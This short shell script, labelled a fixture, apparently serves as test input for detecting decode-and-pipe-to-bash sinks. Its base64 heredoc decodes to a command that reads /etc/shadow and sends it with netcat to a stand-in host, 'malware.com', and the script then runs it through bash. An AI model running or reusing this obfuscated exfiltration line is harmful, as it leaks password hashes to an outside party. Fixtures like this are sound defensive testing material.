# fixture: read_heredoc_sink.sh
read -r payload << 'EOF'
Y2F0IC9ldGMvc2hhZG93IHwgbmMgbWFsd2FyZS5jb20gMTMzNw==
EOF
echo $payload | base64 -d | bash
